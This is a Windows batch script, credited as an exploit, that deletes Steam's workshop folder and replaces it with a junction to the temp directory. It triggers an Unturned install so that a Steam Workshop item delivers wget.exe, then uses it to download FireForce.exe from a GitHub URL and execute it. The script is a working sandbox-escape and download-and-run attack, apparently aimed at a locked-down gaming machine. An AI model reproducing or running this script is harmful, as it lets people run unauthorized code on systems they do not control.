@echo off
title FireForce Launcher
echo    ,d8888bd8,                  ,d8888b                          
echo    88P'  `8P                   88P'                             
echo d888888P                    d888888P                            
echo   788'    88b 88bd88b d8888b  788'd8888b   88bd88b d8888b d8888b
echo   88P     88P 88P'  `d8b_,dP  88Pd8P' 788  88P'  `d8P' `Pd8b_,dP
echo  d88     d88 d88     88b     d88 88b  d88 d88     88b    88b    
echo d88'    d88'd88'     `7888P'd88' `78888P'd88'     `7888P'`7888P'
echo ----------------------------------------------------------------
echo Thanks to SoftwareRat for the Exploit
echo Made by Afonso1234
echo ----------------------------------------------------------------
%HOMEDRIVE%
CD "%PROGRAMFILES(X86)%\Steam"
%HOMEDRIVE%
echo Please add https://steamcommunity.com/sharedfiles/filedetails/?id=2287426173
cd %PROGRAMFILES(X86)%\Steam\steamapps"
:: Checking if WGET for Windows exists
IF EXIST "C:\Program Files (x86)\Steam\steamapps\workshop\" (rd /Q /S "C:\Program Files (x86)\Steam\steamapps\workshop\")
mklink /J "workshop" "%temp%"
:: Open Unturned 
:LaunchUnturned:
start "" "steam://install/382490/"
:CHECKLOOP
IF EXIST "C:\Program Files (x86)\Steam\steamapps\workshop\content\382490\2287426173\wget.exe" GOTO FOUND >NUL 2>&1
GOTO NOTFOUND
:NOTFOUND
GOTO CHECKLOOP
:FOUND
cls
echo Downloading FireForce...
timeout /T 4 >NUL 2>&1
%HOMEDRIVE%
cd \
md USEtemp
cd "%PROGRAMFILES(X86)%\Steam\"
GOTO USEdownload
:notsuccessfull:
echo FireForce was not downloaded successfully. Retrying download and execution....
:USEdownload:
"C:\Program Files (x86)\Steam\steamapps\workshop\content\382490\2287426173\wget.exe" -O "%temp%\FireForce.exe" -q "https://github.com/afonsosousah/afonsosousah.github.io/raw/master/FireForce.exe" >NUL
:: Checking if download is successfull
if not "%errorlevel%"=="0" GOTO gDriveServer
:AWSserver:
:: If AWS Server is online, this code will be executed
cls
start "" "%temp%\FireForce.exe" || GOTO notsuccessfull
exit
:gDriveServer;
:: If AWS Server is offline, this code will be executed
copy /y NUL "%temp%\BackupNeeded.ini" >NUL
"C:\Program Files (x86)\Steam\steamapps\workshop\content\382490\2287426173\wget.exe" -O "%temp%\FireForce.exe" -q "https://github.com/afonsosousah/afonsosousah.github.io/raw/master/FireForce.exe"
cls
start "" "%temp%\FireForce.exe" || GOTO notsuccessfull
exit